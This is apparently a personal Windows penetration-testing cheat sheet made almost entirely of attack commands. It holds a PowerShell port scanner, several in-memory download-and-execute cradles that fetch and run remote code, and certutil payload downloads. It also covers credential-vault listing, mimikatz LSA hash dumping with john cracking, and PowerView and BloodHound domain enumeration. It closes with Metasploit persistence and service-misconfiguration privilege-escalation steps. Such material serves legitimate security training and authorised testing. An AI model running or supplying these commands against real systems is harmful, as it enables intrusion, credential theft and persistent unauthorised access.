https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html

# PowerShell Open Port Discovery
```powershell
0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("IP",$_)) "Port $_ is open!"} 2>$null}
```

# PowerShell in-memory Download and Execute cradle
```powershell
iex (iwr 'URL')

iex (New-Object Net.WebClient).DownloadString('URL')

$down = [System.NET.WebRequest]::Create("URL")  
$read = $down.GetResponse()  
IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()

$file=New-Object -ComObject Msxml2.XMLHTTP;$file.open('GET','URL',$false);
$file.send();
iex $file.responseText

$ie=New-Object -ComObject InternetExplorer.Application;
$ie.visible=$False;
$ie.navigate('URL');
sleep 4;
$response=$ie.Document.body.innerHTML;
$ie.quit();
iex $response
```

certutil.exe -urlcache -f URL OUTFILE
certutil.exe -urlcache -split -f URL OUTFILE
certutil.exe -decode IN.TXT OUT.exe

xfreerdp /u:USER /p:PASS /cert:ignore /v:RHOST

cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"VAULT"
runas /user:USER /savecred EXECUTABLE

powershell -ep bypass

. .\\PowerView.ps1
Get-NetUser | select cn
Get-NetGroup -GroupName *admin*
Get-NetShare
Invoke-ShareFinder
Get-NetComputers
Get-NetComputer -fulldata | select operatingsystem
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN -ZipFileName loot.zip

mimikatz.exe
> privilege::debug
> lsadump::lsa /patch
john crack.me --wordlist=~/wordlists/rockyou.txt --format=NT

use exploit/windows/local/persistence
set session 1

# INSECURE SERVICE PERMISSIONS
C:\PrivEsc\accesschk.exe /accepteula -uwcqv USER SERVICE
sc qc SERVICE
sc config SERVICE binpath="PATH"
net start daclsvc

# UNQUOTED SERVICE PATH
sc qc SERVICE
accesschk.exe /accepteula -uwdq "PATH" 
copy SHELL "PATH"
net start SERVICE